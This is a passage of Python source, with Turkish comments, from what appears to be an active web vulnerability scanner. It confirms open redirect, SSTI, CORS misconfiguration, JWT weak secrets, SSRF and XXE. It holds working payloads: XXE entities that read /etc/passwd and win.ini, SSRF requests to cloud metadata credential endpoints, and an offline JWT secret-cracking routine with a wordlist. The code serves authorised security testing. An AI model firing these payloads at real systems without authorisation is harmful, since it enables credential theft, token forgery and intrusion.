        only = param if param and param in bparams else None
        token = _sec.token_hex(6)
        for base_variant in _redirect_variants(token):
            for variant, mut_name in apply_mutations(base_variant, mutations or [], include_identity=not mutations):
                for body, hit_param in build_injected_bodies(bparams, variant,
                                                             replace=True, only_param=only):
                    try:
                        if send_json:
                            r = await client.request(m.upper(), url, json=body,
                                                     timeout=15.0, follow_redirects=False)
                        else:
                            r = await client.request(m.upper(), url, data=body,
                                                     timeout=15.0, follow_redirects=False)
                    except Exception:
                        continue
                    if 300 <= r.status_code < 400:
                        loc = r.headers.get("location", "")
                        if is_open_redirect_location(loc):
                            mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                            return Verdict(
                                True, 0.95, "open-redirect-location",
                                f"{m.upper()} gövdesi '{hit_param}' parametresi saldırgan-kontrollü "
                                f"sentinel host'a ({_SENTINEL_HOST}) 30x Location ile yönlendirdi "
                                f"— phishing zinciri için istismar edilebilir. "
                                f"Open Redirect TEYİT edildi.{mut_note}",
                                mutation=mut_name)
        return Verdict(False, 0.0, "open-redirect-location",
                       "Hiçbir gövde varyantı sentinel host'a yönlendirmedi — doğrulanmadı.")

    parts = urlsplit(url)
    params = parse_qsl(parts.query, keep_blank_values=True)
    if not params:
        return Verdict(False, 0.0, "open-redirect-location",
                       "Enjekte edilebilir sorgu parametresi yok — doğrulama atlandı.",
                       skipped=True)
    only = param if param and any(k == param for k, _ in params) else None

    token = _sec.token_hex(6)
    for base_variant in _redirect_variants(token):
        for variant, mut_name in apply_mutations(base_variant, mutations or [], include_identity=not mutations):
            for inj_url in _replace_param_urls(url, variant, only_param=only):
                try:
                    r = await client.get(inj_url, timeout=15.0, follow_redirects=False)
                except Exception:
                    continue
                if 300 <= r.status_code < 400:
                    loc = r.headers.get("location", "")
                    if is_open_redirect_location(loc):
                        hit_param = next((k for k, v in parse_qsl(urlsplit(inj_url).query)
                                          if v == variant), only or "?")
                        mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                        return Verdict(
                            True, 0.95, "open-redirect-location",
                            f"Yönlendirme parametresi saldırgan-kontrollü sentinel host'a "
                            f"({_SENTINEL_HOST}) 30x Location ile yönlendirdi (param={hit_param}) "
                            f"— phishing zinciri için istismar edilebilir. "
                            f"Open Redirect TEYİT edildi.{mut_note}",
                            mutation=mut_name)
    return Verdict(False, 0.0, "open-redirect-location",
                   "Hiçbir varyant sentinel host'a yönlendirmedi — doğrulanmadı.")


# ============================================================
# Grup A — SSTI (CWE-1336)
# ============================================================
# Fikir: parametreye ARİTMETİK marker enjekte et; çıktıda HESAPLANMIŞ sonuç görünürse şablon
# motoru payload'u değerlendiriyor demektir (RCE'ye açılan kapı — kritik).
# GÜVENLİK: yalnız aritmetik — komut/dosya payload'u DENENMEZ (tahribat riski). Benzersiz
# asal çarpımı tesadüf eşleşmesini eler.


def ssti_arithmetic_evaluated(body: str, expected_product: int, raw_expr: str) -> bool:
    """Şablon motoru ifadeyi DEĞERLENDİRDİ mü? (SAF — I/O yok)

    Kural: hesaplanmış çarpım gövdede VAR ama ham ifade metni YOK → değerlendirilmiş.
    Ham ifade de geçiyorsa sunucu yansıtıyor ama değerlendirmiyor demektir (güvenli)."""
    if not body:
        return False
    return str(expected_product) in body and raw_expr not in body


# Farklı şablon motoru sözdizimleri: Jinja2/Twig, FreeMarker, Mako/ERB.
# T4-A: inline çekirdek → fallback; corpus ek motor sözdizimi getirdiyse merge edilir.
_SSTI_TEMPLATES_INLINE = ["{{{A}*{B}}}", "${{{A}*{B}}}", "#{{{A}*{B}}}", "<%= {A}*{B} %>"]
_SSTI_TEMPLATES = _merge_corpus("ssti", _SSTI_TEMPLATES_INLINE)

# Küçük asal havuzu — her koşuda rastgele ikisi seçilir; çarpım benzersiz ve sayfada
# tesadüfen geçme olasılığı ihmal edilebilir.
_SSTI_PRIMES = [1367, 1409, 1451, 1499, 1531, 1571, 1613]


def _ssti_marker() -> tuple:
    """(asal A, asal B, beklenen çarpım, ham ifade metni) üret."""
    import random as _rnd
    a, b = _rnd.SystemRandom().sample(_SSTI_PRIMES, 2)
    return a, b, a * b, f"{a}*{b}"


async def verify_ssti(url: str, param: Optional[str], client: httpx.AsyncClient,
                      *, mutations: Optional[List[Mutation]] = None,
                      method: str = "get", body_params: Any = None,
                      body_kind: str = "form") -> Verdict:
    """SSTI AKTİF doğrulaması: aritmetik marker hesaplanmış olarak yansırsa verified.
    Değer sonuna eklenir (mevcut bağlam korunur — XSS prober deseni). Mutasyon notu:
    case_swap SSTI'de anlamsızdır (marker rakam+sembol) — profil zaten uygun mutasyon verir;
    mutasyonlu varyantla kanıt gelirse Verdict.mutation dolar.

    P0-B: gövde metodu + body_params verilirse aritmetik marker gövde parametresinin
    sonuna eklenir (mesaj/yorum API'leri — SSTI'nın gerçek yüzeyi)."""
    m = (method or "get").lower()
    bparams = body_params_dict(body_params)
    use_body = m in ("post", "put", "patch") and bool(bparams)
    send_json = body_kind == "json"

    a, b, product, raw_expr = _ssti_marker()

    if use_body:
        only = param if param and param in bparams else None

        async def _send(body: Dict[str, str]) -> Optional[str]:
            return await _fetch_body_request(client, url, method=m.upper(),
                                             json_data=body if send_json else None,
                                             form_data=None if send_json else body)

        baseline = await _send(bparams) or ""
        if str(product) in baseline:
            return Verdict(False, 0.0, "ssti-arithmetic",
                           "Marker çarpımı baseline'da zaten var — tesadüf elemesi, doğrulanmadı.")
        targets = [k for k in bparams if not only or k == only][:5]
        for template in _SSTI_TEMPLATES:
            base_payload = template.replace("{A}", str(a)).replace("{B}", str(b))
            for payload, mut_name in apply_mutations(base_payload, mutations or [], include_identity=not mutations):
                for k in targets:
                    body = dict(bparams)
                    body[k] = f"{body[k]}{payload}"
                    resp_body = await _send(body)
                    if resp_body is None:
                        continue
                    if ssti_arithmetic_evaluated(resp_body, product, raw_expr):
                        mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                        return Verdict(
                            True, 0.9, "ssti-arithmetic",
                            f"{m.upper()} gövdesi '{k}' parametresine enjekte edilen '{payload}' ifadesi "
                            f"yanıtta {product} olarak HESAPLANMIŞ yansıdı — şablon motoru girdiyi "
                            f"değerlendiriyor. SSTI TEYİT edildi; RCE'ye yükseltilebilir, "
                            f"manuel derinleştirme önerilir.{mut_note}",
                            mutation=mut_name)
        return Verdict(False, 0.0, "ssti-arithmetic",
                       "Hiçbir gövde sözdiziminde aritmetik marker değerlendirilmedi — doğrulanmadı.")

    parts = urlsplit(url)
    params = parse_qsl(parts.query, keep_blank_values=True)
    if not params:
        return Verdict(False, 0.0, "ssti-arithmetic",
                       "Enjekte edilebilir sorgu parametresi yok — doğrulama atlandı.",
                       skipped=True)

    baseline = await _fetch_body(client, url) or ""
    if str(product) in baseline:
        # Çarpım baseline'da zaten geçiyorsa kanıt DEĞERSİZ — bu koşuyu pas geç
        # (tesadüf eşleşmesi; başka asal seçmek yerine temkinli kal, false-positive üretme).
        return Verdict(False, 0.0, "ssti-arithmetic",
                       "Marker çarpımı baseline'da zaten var — tesadüf elemesi, doğrulanmadı.")

    targets = [(i, k) for i, (k, _v) in enumerate(params)
               if not param or k == param] or list(enumerate(k for k, _ in params))
    targets = targets[:5]  # dokunuş tavanı (ssti: şablon × parametre çarpımı patlamasın)
    for template in _SSTI_TEMPLATES:
        base_payload = template.replace("{A}", str(a)).replace("{B}", str(b))
        for payload, mut_name in apply_mutations(base_payload, mutations or [], include_identity=not mutations):
            # Mutasyon marker'ın HESAPLANACAK kısmını bozduysa (ör. çift-encode) sunucu
            # yine değerlendirebilir — kontrol her durumda çarpım üzerinden yapılır.
            for i, k in targets:
                mutated = list(params)
                mutated[i] = (k, f"{mutated[i][1]}{payload}")
                inj_url = urlunsplit((parts.scheme, parts.netloc, parts.path,
                                      urlencode(mutated), parts.fragment))
                body = await _fetch_body(client, inj_url)
                if body is None:
                    continue
                if ssti_arithmetic_evaluated(body, product, raw_expr):
                    mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                    return Verdict(
                        True, 0.9, "ssti-arithmetic",
                        f"'{payload}' ifadesi yanıtta {product} olarak HESAPLANMIŞ yansıdı "
                        f"(param={k}) — şablon motoru girdiyi değerlendiriyor. SSTI TEYİT edildi; "
                        f"RCE'ye yükseltilebilir, manuel derinleştirme önerilir.{mut_note}",
                        mutation=mut_name)
    return Verdict(False, 0.0, "ssti-arithmetic",
                   "Hiçbir sözdiziminde aritmetik marker değerlendirilmedi — doğrulanmadı.")


# ============================================================
# T2-B — CORS Misconfiguration (CWE-942)
# ============================================================
# Fikir: keyfi bir saldırgan-origin gönder; sunucu bunu Access-Control-Allow-Origin'de
# AYNEN yansıtıyor VE Allow-Credentials:true ise, saldırgan sayfası kurbanın kimlikli
# verisini cross-origin okuyabilir. Yanıt başlığının kendisi KANITTIR (deterministik,
# tahribatsız — tek GET). false-positive elemesi: sabit ACAO (yansımayan) güvenli;
# ACAO '*' (credentials yok) public API, tek başına bulgu değil.

_CORS_EVIL_HOST = "kadim-cors-evil.invalid"


def _evil_origin() -> str:
    """Benzersiz saldırgan-origin — her koşuda taze (bayat yankı değil TAZE yansıma)."""
    return f"https://{_secrets.token_hex(4)}.{_CORS_EVIL_HOST}"


def is_cors_vulnerable(sent_origin: str, acao: Optional[str],
                       acac: Optional[str]) -> tuple:
    """CORS yanıt başlıklarından zafiyet kararı (SAF). Döner (verified, severity, reason).

    acao = Access-Control-Allow-Origin yanıtı; acac = Access-Control-Allow-Credentials.

    FP DİSİPLİNİ (doktrin: confirmed=gerçekten sömürülebilir): CORS ancak KİMLİKLİ
    (Allow-Credentials:true) yansımada sömürülebilir — yalnız o zaman tarayıcı kurbanın
    oturumuyla cross-origin okur. Credentials YOKSA veri zaten no-cors/sunucu-taraflı
    erişilebilir; reflected-origin tek başına bulgu DEĞİL → confirmed üretme (FP kaynağı).
    ACAO '*' + creds tarayıcıca reddedilir (doğrudan sömürülemez) → confirmed değil."""
    if not acao:
        return (False, "info", "ACAO başlığı yok — CORS cross-origin paylaşımı açık değil.")
    acao_v = acao.strip()
    creds = str(acac or "").strip().lower() == "true"
    if not creds:
        # Credentials kapalı → kimlikli veri sızmaz. Reflected/null olsa bile confirmed DEĞİL.
        if acao_v == sent_origin or acao_v.lower() == "null":
            return (False, "info",
                    f"ACAO keyfi origin'i yansıtıyor ({acao_v}) ama Allow-Credentials yok — "
                    f"kimlikli veri sızmaz; confirmed bulgu değil (FP kaçınma).")
        return (False, "info", f"ACAO ({acao_v}) — credentials yok / sabit; güvenli.")
    # creds == True → KİMLİKLİ senaryo (asıl sömürülebilir hal):
    if acao_v == sent_origin:
        return (True, "high",
                f"Sunucu saldırgan-kontrollü Origin'i ({sent_origin}) ACAO'da AYNEN yansıttı "
                f"VE Allow-Credentials:true — kurbanın kimlikli (cookie/oturum) verisi "
                f"cross-origin OKUNABİLİR. CORS misconfig TEYİT edildi.")
    if acao_v.lower() == "null":
        return (True, "high",
                "ACAO 'null' + Allow-Credentials:true — sandboxed iframe / data-URI "
                "origin'inden kimlikli erişim mümkün. TEYİT edildi.")
    if acao_v == "*":
        # Tarayıcı '*'+credentials'ı reddeder → DOĞRUDAN sömürülemez. Misconfig ama
        # confirmed bulgu üretmiyoruz (FP disiplini).
        return (False, "info",
                "ACAO '*' + Allow-Credentials:true — spec-dışı ama tarayıcı reddeder; "
                "doğrudan sömürülemez, confirmed değil.")
    return (False, "info",
            f"ACAO sabit ({acao_v}) + creds — saldırgan origin'i yansımadı; güvenli.")


async def verify_cors(url: str, client: httpx.AsyncClient, *,
                      headers: Optional[Dict[str, str]] = None) -> Verdict:
    """CORS misconfig AKTİF doğrulaması: keyfi Origin gönder, ACAO/ACAC yansımasını ölç.
    TAHRİBATSIZ (tek GET). headers verilirse (auth) kimlikli endpoint'te de çalışır —
    kimlikli veri sızıntısı asıl yüksek-etkili senaryodur."""
    evil = _evil_origin()
    req_headers = {**(headers or {}), "Origin": evil}
    try:
        r = await client.get(url, headers=req_headers, timeout=15.0)
    except Exception:
        return Verdict(False, 0.0, "cors-reflection", "İstek başarısız — doğrulanmadı.")
    acao = r.headers.get("access-control-allow-origin")
    acac = r.headers.get("access-control-allow-credentials")
    verified, severity, reason = is_cors_vulnerable(evil, acao, acac)
    return Verdict(verified, 0.9 if verified else 0.0, "cors-reflection",
                   f"{reason} [gönderilen Origin: {evil}; ACAO: {acao}; ACAC: {acac}]",
                   severity=severity if verified else None)


# ============================================================
# T2-B — JWT Zayıflıkları (CWE-347/CWE-345) — TAMAMEN OFFLINE
# ============================================================
# Fikir: elimizdeki token (auth başlığı / cookie / JS'te sızmış) HS256 ise, zayıf-sır
# sözlüğüyle HMAC imzasını OFFLINE kırmayı dene. İmza eşleşirse SIRRI ELDE ETMİŞİZDİR →
# istediğimiz iddiaları (admin=true, farklı sub) taşıyan GEÇERLİ token üretebiliriz →
# tam auth-bypass. Bu deterministik, ağ-GEREKTİRMEYEN, tahribatsız bir KANITTIR.
# Ayrıca alg=none tespiti: canlı token alg=none ise sunucu imzasız token kabul ediyordur.

import hashlib as _hashlib
import hmac as _hmac
import json as _json

_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

# Küratörlü zayıf-sır sözlüğü — pratikte en sık görülen HMAC sırları (framework
# varsayılanları + yaygın zayıf değerler). Kısa tutulur (offline ama yine de bütçeli).
_JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "changeme", "jwt", "token", "key",
    "your-256-bit-secret", "secretkey", "secret_key", "private", "test", "qwerty",
    "root", "pass", "supersecret", "s3cr3t", "mysecret", "default", "12345678",
    "letmein", "welcome", "shhhhh", "jwtsecret", "jwt_secret", "signing_key",
    "hmac", "0000", "1234567890", "iloveyou", "access", "refresh", "api",
]


def _b64url_decode(seg: str) -> bytes:
    """base64url segmentini (padding'siz olabilir) çöz. Hatalıysa boş bytes."""
    if not seg:
        return b""
    pad = "-_"
    s = seg.strip()
    s = s + "=" * (-len(s) % 4)
    try:
        return base64.urlsafe_b64decode(s.encode("ascii"))
    except Exception:
        return b""


def decode_jwt(token: str) -> Optional[Dict[str, Any]]:
    """JWT'yi ayrıştır (SAF — imza DOĞRULAMAZ, sadece çözer). Döner:
    {"header":dict, "payload":dict, "signing_input":str, "signature":str} ya da None."""
    if not token or token.count(".") != 2:
        return None
    h_seg, p_seg, s_seg = token.split(".")
    try:
        header = _json.loads(_b64url_decode(h_seg) or b"{}")
        payload = _json.loads(_b64url_decode(p_seg) or b"{}")
    except Exception:
        return None
    if not isinstance(header, dict):
        return None
    return {"header": header, "payload": payload if isinstance(payload, dict) else {},
            "signing_input": f"{h_seg}.{p_seg}", "signature": s_seg}


def analyze_jwt(token: str) -> Dict[str, Any]:
    """JWT'nin zayıflık yüzeyini SAF analiz et (ağ yok). Döner:
    {"valid_jwt":bool, "alg":str, "alg_none":bool, "hs":bool, ...}."""
    dec = decode_jwt(token)
    if not dec:
        return {"valid_jwt": False}
    alg = str(dec["header"].get("alg") or "").strip()
    return {
        "valid_jwt": True,
        "alg": alg,
        "alg_none": alg.lower() == "none",
        "hs": alg.upper() in ("HS256", "HS384", "HS512"),
        "header": dec["header"],
        "payload": dec["payload"],
    }


def crack_jwt_secret(token: str, wordlist: Optional[List[str]] = None) -> Optional[str]:
    """HS256/384/512 imzasını zayıf-sır sözlüğüyle OFFLINE kır (SAF — ağ yok). İmza
    eşleşen ilk sırrı döndür; hiçbiri tutmuyorsa None. Sır bulunursa saldırgan geçerli
    token FORGE edebilir (tam auth bypass) → confirmed."""
    dec = decode_jwt(token)
    if not dec:
        return None
    alg = str(dec["header"].get("alg") or "").upper()
    algo = {"HS256": _hashlib.sha256, "HS384": _hashlib.sha384,
            "HS512": _hashlib.sha512}.get(alg)
    if algo is None:
        return None
    try:
        expected_sig = _b64url_decode(dec["signature"])
    except Exception:
        return None
    if not expected_sig:
        return None
    signing_input = dec["signing_input"].encode("ascii")
    for secret in (wordlist if wordlist is not None else _JWT_WEAK_SECRETS):
        try:
            calc = _hmac.new(secret.encode("utf-8"), signing_input, algo).digest()
        except Exception:
            continue
        if _hmac.compare_digest(calc, expected_sig):
            return secret
    return None


def verify_jwt(token: str, *, wordlist: Optional[List[str]] = None) -> Verdict:
    """JWT AKTİF doğrulaması — TAMAMEN OFFLINE (ağ yok). Öncelik:
      1) HS* sır kırıldı → **critical** confirmed (token forge → auth bypass).
      2) alg=none → **high** confirmed (imzasız token; canlı token ise sunucu kabul ediyor).
    Aksi halde verified=False (zayıf değil / asimetrik alg — kırılamaz)."""
    info = analyze_jwt(token)
    if not info.get("valid_jwt"):
        return Verdict(False, 0.0, "jwt-analysis", "Geçerli JWT değil — atlandı.", skipped=True)
    if info.get("alg_none"):
        return Verdict(True, 0.9, "jwt-alg-none",
                       "Token 'alg=none' taşıyor — imzasız (unsigned) JWT. Sunucu bunu kabul "
                       "ediyorsa saldırgan istediği iddiaları taşıyan token üretebilir "
                       "(auth bypass). TEYİT edildi.", severity="high")
    if info.get("hs"):
        secret = crack_jwt_secret(token, wordlist=wordlist)
        if secret is not None:
            masked = (secret[:2] + "***") if len(secret) > 2 else "***"
            return Verdict(True, 0.98, "jwt-weak-hmac-secret",
                           f"JWT HMAC imza sırrı OFFLINE kırıldı (zayıf sır: '{masked}', "
                           f"alg={info.get('alg')}). Saldırgan geçerli token FORGE edebilir "
                           f"(admin=true / farklı sub) — tam kimlik doğrulama bypass'ı. "
                           f"TEYİT edildi.", severity="critical")
        return Verdict(False, 0.0, "jwt-weak-hmac-secret",
                       f"HS imza zayıf-sır sözlüğüyle kırılamadı (alg={info.get('alg')}) — "
                       f"sır güçlü görünüyor, doğrulanmadı.")
    return Verdict(False, 0.0, "jwt-analysis",
                   f"alg={info.get('alg')} (asimetrik/kırılamaz) — offline zayıflık yok.")


# ============================================================
# T2-B — SSRF (CWE-918) — TEMKİNLİ: yalnız metadata-imzasında confirmed
# ============================================================
# Fikir: URL-benzeri parametreye BİLİNEN iç/metadata hedefi enjekte et; yanıtta bulut
# metadata imzası görünürse sunucu bizim adımıza iç ağa istek yaptı → SSRF KANITLANDI.
# OOB (out-of-band) callback altyapımız YOK, bu yüzden yalnız İN-BAND imza (yanıta yansıyan
# metadata) confirmed sayılır — kör SSRF burada işaretlenmez (false-positive üretme).
# TAHRİBATSIZ: yalnız OKUMA (metadata GET); yazma/komut yok.

_SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",                      # AWS IMDS
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",           # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
]

_SSRF_SIG = re.compile(
    r"ami-id|instance-id|instance-type|iam/security-credentials|security-credentials|"
    r"computeMetadata|ami-launch-index|placement/availability-zone|"
    r"\"compute\"\s*:|InstanceMetadata|accessKeyId", re.I)

# URL taşıyan parametre adları — SSRF'nin yaşadığı yer. TEMKİNLİ küme: yalnız
# belirgin-URL adları (page/to/out/view gibi jenerik adlar FP üretir — onlar zaten
# değeri http ile başlıyorsa _url_like_params'ın değer-kontrolünde yakalanır).
_URL_PARAM_HINT = re.compile(
    r"(?:^|_|-)(url|uri|urls|link|source|dest|destination|redirect|redirect_uri|"
    r"target|fetch|callback|webhook|proxy|image_url|imageurl|feed|continue|return_url|"
    r"next_url|load_url|open_url|remote|upstream|origin_url)(?:$|_|-)", re.I)


def detect_ssrf_signature(body: str) -> Optional[str]:
    """Yanıt gövdesinde bulut metadata imzası ara (SAF). Varsa imza adını döndür.
    Bu imzalar rastgele sayfalarda pratikte GEÇMEZ → yansırsa SSRF confirmed."""
    if not body:
        return None
    m = _SSRF_SIG.search(body)
    return m.group(0) if m else None


def _url_like_params(url: str) -> List[str]:
    """URL'de SSRF adayı (URL-benzeri) parametre adlarını döndür (SAF). Ad-ipucu VEYA
    değeri http ile başlayan parametreler."""
    out: List[str] = []
    for k, v in parse_qsl(urlsplit(url).query, keep_blank_values=True):
        if _URL_PARAM_HINT.search(k) or str(v).lower().startswith(("http://", "https://")):
            out.append(k)
    return list(dict.fromkeys(out))


async def verify_ssrf(url: str, param: Optional[str], client: httpx.AsyncClient,
                      *, headers: Optional[Dict[str, str]] = None,
                      oast_client: Optional[Any] = None) -> Verdict:
    """SSRF AKTİF doğrulaması (in-band ve OOB): URL-benzeri parametreye metadata hedefi
    veya OAST callback adresi enjekte et. Metadata imzası yansırsa VEYA OAST callback
    ulaşırsa SSRF confirmed. GCP metadata için gerekli başlık da denenir."""
    only = param
    candidates = [only] if (only and only in _url_like_params(url)) else _url_like_params(url)
    if not candidates:
        return Verdict(False, 0.0, "ssrf-metadata",
                       "URL-benzeri parametre yok — SSRF doğrulaması atlandı.",
                       skipped=True)
    base_headers = dict(headers or {})

    # 1. OAST (Out-of-Band) ENJEKSİYONU — kör SSRF için birincil kanıt yolu. Callback ASENKRON
    #    döner (backend saniyeler sonra istek atar); bu yüzden burada HEMEN yoklamak boşunaydı
    #    (poll daima boş döner, enjeksiyon+ekstra istek boşa gider). Token engine.oast_client'a
    #    KAYITLI kalır → tur-sonu _poll_oast_callbacks korelasyonu yapıp kör kanıtı yayınlar.
    #    Burada yalnız payload'u enjekte edip callback'i TETİKLİYORUZ.
    if oast_client is not None:
        for pname in candidates[:3]:
            _tok, fqdn = oast_client.generate_payload("ssrf", {"url": url, "param": pname})
            oast_url = f"http://{fqdn}/"
            for inj_url in _replace_param_urls(url, oast_url, only_param=pname):
                try:
                    await client.get(inj_url, headers=base_headers, timeout=8.0)
                except Exception:
                    pass

    # MOCK-MOD ANLIK ONAY (izole test/CI): mock transport geri aramayı SENKRON kaydeder;
    # gerçek modda callback asenkron gelir — orada tur-sonu _poll_oast_callbacks yeter.
    if oast_client is not None and getattr(oast_client, "mock_mode", False):
        for hit in await oast_client.poll_interactions():
            if getattr(hit, "marker", "") == "ssrf":
                proof = (f"OAST sunucusuna {hit.protocol.upper()} geri araması ulaştı. "
                         f"Kaynak Backend IP: {hit.remote_address}, Token: {hit.full_id}")
                return Verdict(True, 0.95, "ssrf-oast", proof, severity="high")

    # 2. In-band metadata denemesi (AWS/GCP/Azure)
    for pname in candidates[:5]:
        for target in _SSRF_TARGETS:
            for inj_url in _replace_param_urls(url, target, only_param=pname):
                req_headers = dict(base_headers)
                if "metadata.google" in target:
                    req_headers["Metadata-Flavor"] = "Google"  # GCP zorunlu başlık
                try:
                    r = await client.get(inj_url, headers=req_headers, timeout=12.0)
                except Exception:
                    continue
                body = (r.text or "")[:64_000] if r.status_code < 500 else ""
                sig = detect_ssrf_signature(body)
                if sig:
                    return Verdict(
                        True, 0.9, "ssrf-metadata",
                        f"'{pname}' parametresine iç metadata hedefi ({target}) enjekte edildi; "
                        f"yanıtta bulut metadata imzası ('{sig}') görüldü — sunucu bizim adımıza "
                        f"iç ağa istek yaptı. SSRF TEYİT edildi (kimlik bilgisi sızıntısına "
                        f"yükseltilebilir).", severity="high")
    return Verdict(False, 0.0, "ssrf-metadata",
                   "Metadata imzası yansımadı ve OAST geri araması tespit edilemedi — SSRF doğrulanmadı.")


# ============================================================
# T2-B — XXE (CWE-611) — in-band harici varlık dosya okuma
# ============================================================
# Fikir: XML kabul eden bir uca, /etc/passwd okuyan bir HARİCİ VARLIK (external entity)
# taşıyan XML gönder; yanıtta dosya imzası (detect_lfi_signature) çıkarsa XXE KANITLANDI.
# TAHRİBATSIZ: klasik external-entity dosya OKUMA — billion-laughs/özyineleme (DoS) YOK.
# Blind XXE (OOB) burada işaretlenmez.

_XXE_ENTITY = "kadimxxe"
_XXE_PAYLOADS = [
    # /etc/passwd
    ('<?xml version="1.0" encoding="UTF-8"?>'
     '<!DOCTYPE r [<!ENTITY {e} SYSTEM "file:///etc/passwd">]>'
     '<r>&{e};</r>'),
    # php://filter ile kaynak kod (base64) — detect_lfi_signature php_filter_source yakalar
    ('<?xml version="1.0" encoding="UTF-8"?>'
     '<!DOCTYPE r [<!ENTITY {e} SYSTEM '
     '"php://filter/convert.base64-encode/resource=index.php">]>'
     '<r>&{e};</r>'),
    # Windows
    ('<?xml version="1.0" encoding="UTF-8"?>'
     '<!DOCTYPE r [<!ENTITY {e} SYSTEM "file:///c:/windows/win.ini">]>'
     '<r>&{e};</r>'),
]


async def verify_xxe(url: str, client: httpx.AsyncClient, *, method: str = "post",
                     headers: Optional[Dict[str, str]] = None,
                     oast_client: Optional[Any] = None) -> Verdict:
    """XXE AKTİF doğrulaması (in-band ve OOB): uca XML external-entity payload'u POST et.
    Dosya imzası dönerse VEYA OAST sunucusuna HTTP/DNS callback gelirse XXE confirmed."""
    m = (method or "post").upper()
    if m not in ("POST", "PUT", "PATCH"):
        m = "POST"
    req_headers = {**(headers or {}), "Content-Type": "application/xml"}

    # 1. OAST (Out-of-Band) callback denemesi (kör XXE için)
    if oast_client is not None:
        # OAST ENJEKSİYONU (kör XXE). Callback ASENKRON → anlık poll daima boş dönerdi; token
        # engine.oast_client'a kayıtlı kalır, tur-sonu _poll_oast_callbacks kör kanıtı yayınlar.
        # Burada yalnız harici-varlık payload'unu gönderip callback'i tetikliyoruz.
        _tok, fqdn = oast_client.generate_payload("xxe", {"url": url})
        oast_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE r [<!ENTITY {_XXE_ENTITY} SYSTEM "http://{fqdn}/xxe">]>'
            f'<r>&{_XXE_ENTITY};</r>'
        )
        try:
            await client.request(m, url, content=oast_payload.encode("utf-8"),
                                 headers=req_headers, timeout=8.0)
        except Exception:
            pass

    # MOCK-MOD ANLIK ONAY (izole test/CI) — verify_ssrf ile aynı gerekçe.
    if oast_client is not None and getattr(oast_client, "mock_mode", False):
        for hit in await oast_client.poll_interactions():
            if getattr(hit, "marker", "") == "xxe":
                proof = (f"OAST sunucusuna {hit.protocol.upper()} geri araması ulaştı. "
                         f"Kaynak Backend IP: {hit.remote_address}, Token: {hit.full_id}")
                return Verdict(True, 0.95, "xxe-oast", proof, severity="critical")

    # 2. In-band dosya okuma denemesi
    for tmpl in _XXE_PAYLOADS:
        payload = tmpl.format(e=_XXE_ENTITY)
        try:
            r = await client.request(m, url, content=payload.encode("utf-8"),
                                     headers=req_headers, timeout=15.0)
        except Exception:
            continue
        if r.status_code >= 500:
            continue
        body = (r.text or "")[:64_000]
        sig = detect_lfi_signature(body)
        if sig:
            return Verdict(
                True, 0.9, "xxe-file-read",
                f"XML external-entity payload'u ({m}, Content-Type: application/xml) gönderildi; "
                f"yanıtta '{sig}' dosya imzası görüldü — XML ayrıştırıcı harici varlığı çözdü "
                f"ve yerel dosyayı okudu. XXE TEYİT edildi.", severity="high")
    return Verdict(False, 0.0, "xxe-file-read",
                   "Hiçbir XXE payload'unda dosya imzası yansımadı ve OAST geri araması tespit edilemedi.")


# ============================================================
# T3-A — Adaptif (LLM-zanaatı) payload doğrulaması
# ============================================================
# LLM hedefe/WAF'a özgü payload'lar ÖNERİR (adaptive_payloads.craft_payloads); onay YİNE
# mevcut deterministik imzalarla yapılır (SLEEP zamanlaması / marker yansıması / dosya
# imzası / aritmetik değerlendirme). LLM asla "zafiyet var" demez — kanıtı bu fonksiyon
# üretir. Böylece LLM'in yaratıcılığı FP üretmeden kullanılır (doktrin: LLM zanaatlar,
# çekirdek onaylar). Query-hattı enjeksiyon (gövde-hattı genişletmeye açık).

async def verify_adaptive(url: str, param: Optional[str], vuln_class: str,
                          payloads: List[str], client: httpx.AsyncClient,
                          *, delay_seconds: float = 5.0) -> Verdict:
    """LLM-zanaatı payload listesini sınıfın DETERMİNİSTİK imzasıyla doğrula. Payload'lar
    sınıf placeholder'ını taşır ({D}/{MARKER}/{A}{B}) veya LFI kanaryası içerir; burada
    doldurulup imza kontrolünden geçer. Hiçbiri tutmazsa verified=False (FP üretmez)."""
    if not payloads:
        return Verdict(False, 0.0, f"{vuln_class}-llm-adaptive", "Adaptif payload üretilmedi.")
    parts = urlsplit(url)
    params = parse_qsl(parts.query, keep_blank_values=True)
    if not params:
        return Verdict(False, 0.0, f"{vuln_class}-llm-adaptive",
                       "Enjekte edilebilir sorgu parametresi yok — adaptif doğrulama atlandı.",
                       skipped=True)
    only = param if param and any(k == param for k, _ in params) else None

    if vuln_class == "sqli":
        samples: List[TimingSample] = []
        for _ in range(2):
            ms = await _timed_get(client, url)
            if ms is not None:
                samples.append(TimingSample(0.0, ms))
        for tmpl in payloads:
            payload = tmpl.replace("{D}", str(int(delay_seconds)))
            for inj in build_injected_urls(url, payload):
                ms = await _timed_get(client, inj)
                if ms is not None:
                    samples.append(TimingSample(delay_seconds, ms))
                if confirm_time_based_sqli(samples).verified:
                    confirm_ms = await _timed_get(client, inj)
                    if confirm_ms is not None:
                        samples.append(TimingSample(delay_seconds, confirm_ms))
                    v = confirm_time_based_sqli(samples)
                    if v.verified:
                        return Verdict(True, v.confidence, "sqli-llm-adaptive",
                                       f"LLM-zanaatı payload zaman-tabanlı SQLi'yi doğruladı "
                                       f"(WAF/bağlam-uyarlı): {v.detail}")
        return Verdict(False, 0.0, "sqli-llm-adaptive",
                       "LLM-zanaatı payload'ları da SQLi doğrulamadı.")

    if vuln_class == "xss":
        for tmpl in payloads:
            marker = _reflected_xss_marker()
            payload = tmpl.replace("{MARKER}", marker)
            for i, (k, v) in enumerate(params):
                if only and k != only:
                    continue
                mutated = list(params)
                mutated[i] = (k, f"{v}{payload}")
                inj = urlunsplit((parts.scheme, parts.netloc, parts.path,
                                  urlencode(mutated), parts.fragment))
                body = await _fetch_body(client, inj)
                if body and _marker_reflected_unescaped(marker, body):
                    return Verdict(True, 0.85, "xss-llm-adaptive",
